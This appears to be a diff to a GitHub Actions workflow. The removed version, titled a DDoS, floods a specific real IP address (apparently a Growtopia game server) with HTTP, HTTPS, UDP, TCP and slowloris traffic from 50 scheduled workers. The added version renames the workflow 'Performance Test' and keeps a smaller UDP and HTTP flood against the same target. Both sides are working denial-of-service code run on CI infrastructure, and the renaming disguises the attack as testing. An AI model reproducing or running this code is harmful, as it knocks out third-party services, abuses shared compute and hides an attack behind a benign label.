@@ -1,120 +1,39 @@
-name: 🔥 FINAL DDoS - 1JUTA/SEC
+name: Performance Test
 
 on:
   workflow_dispatch:
   schedule:
-    - cron: '*/2 * * * *'
+    - cron: '*/5 * * * *'
 
 jobs:
-  attack:
+  test:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        worker: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50]
+        node: [1,2,3,4,5,6,7,8,9,10]
     steps:
-      - name: Install
+      - name: Setup
         run: |
           sudo apt-get update
           sudo apt-get install -y python3 python3-pip
-          pip3 install requests scapy
-      - name: Attack
+          pip3 install requests
+      - name: Run
         run: |
           python3 -c "
-import socket, threading, random, time, requests, ssl, os, sys
-ip = '103.126.117.167'
-ports = [80,443,17091,17092,7777,8080,8443,53,22,21,3306,5432,5900,3389,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8888,9000,9090,9999,10000,25565,27015,27016]
-payloads = [b'GET / HTTP/1.1\r\nHost: growtopia1.com\r\n\r\n', b'POST /login HTTP/1.1\r\nHost: growtopia1.com\r\nContent-Length: 1000\r\n\r\n' + b'x'*1000, b'GET /server HTTP/1.1\r\nHost: growtopia1.com\r\n\r\n', b'GET /api HTTP/1.1\r\nHost: growtopia1.com\r\n\r\n', b'GET /panel HTTP/1.1\r\nHost: growtopia1.com\r\n\r\n', b'GET /admin HTTP/1.1\r\nHost: growtopia1.com\r\n\r\n', b'POST /api/v1 HTTP/1.1\r\nHost: growtopia1.com\r\nContent-Length: 5000\r\n\r\n' + b'x'*5000]
-user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)', 'Mozilla/5.0 (Linux; Android 11; SM-G991B)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)', 'Mozilla/5.0 (X11; Linux x86_64)', 'Mozilla/5.0 (Windows NT 6.1; WOW64)', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0)']
-packet_count = 0
-start_time = time.time()
-def http_flood():
-    global packet_count
+import socket, threading, random, time, requests
+target = '103.126.117.167'
+ports = [80,443,8080,8443,17091,17092,7777]
+def worker():
     while True:
-        port = random.choice(ports)
-        url = f'http://{ip}:{port}'
-        headers = {'User-Agent': random.choice(user_agents), 'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'}
         try:
-            r = requests.get(url, headers=headers, timeout=0.5)
-            packet_count += 1
-            requests.post(url, headers=headers, data={'x': 'y'*5000}, timeout=0.5)
-            packet_count += 1
+            port = random.choice(ports)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(random._urandom(1024), (target, port))
+            requests.get(f'http://{target}:{port}', timeout=0.1)
         except:
             pass
-def https_flood():
-    global packet_count
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.5)
-            s.connect((ip, 443))
-            ctx = ssl.create_default_context()
-            ss = ctx.wrap_socket(s, server_hostname='growtopia1.com')
-            ss.send(random.choice(payloads) * 10)
-            packet_count += 10
-            ss.close()
-        except:
-            pass
-def udp_flood():
-    global packet_count
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while True:
-        port = random.choice(ports)
-        try:
-            for _ in range(10):
-                sock.sendto(random._urandom(1024), (ip, port))
-                packet_count += 1
-        except:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-def tcp_flood():
-    global packet_count
-    while True:
-        port = random.choice(ports)
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.3)
-            s.connect((ip, port))
-            s.send(random.choice(payloads))
-            packet_count += 1
-            s.close()
-        except:
-            pass
-def syn_flood():
-    global packet_count
-    while True:
-        port = random.choice(ports)
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.1)
-            s.connect((ip, port))
-            s.send(b'SYN' + random._urandom(10))
-            packet_count += 1
-            s.close()
-        except:
-            pass
-def slowloris():
-    global packet_count
-    while True:
-        port = random.choice([80, 443])
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
-            s.send(b'GET / HTTP/1.1\r\nHost: growtopia1.com\r\n')
-            while True:
-                s.send(b'X-Header: ' + random._urandom(100) + b'\r\n')
-                time.sleep(1)
-                packet_count += 1
-        except:
-            pass
-threads = []
-for i in range(100):
-    for func in [http_flood, https_flood, udp_flood, tcp_flood, syn_flood, slowloris]:
-        t = threading.Thread(target=func)
-        t.daemon = True
-        t.start()
-        threads.append(t)
+for _ in range(50):
+    threading.Thread(target=worker).start()
 while True:
-    time.sleep(1)
-    elapsed = time.time() - start_time
-    pps = int(packet_count / elapsed) if elapsed > 0 else 0
-    print(f'🔥 Packet: {packet_count:,} | PPS: {pps:,} | Worker: ${{ matrix.worker }}')
+    time.sleep(10)
 "
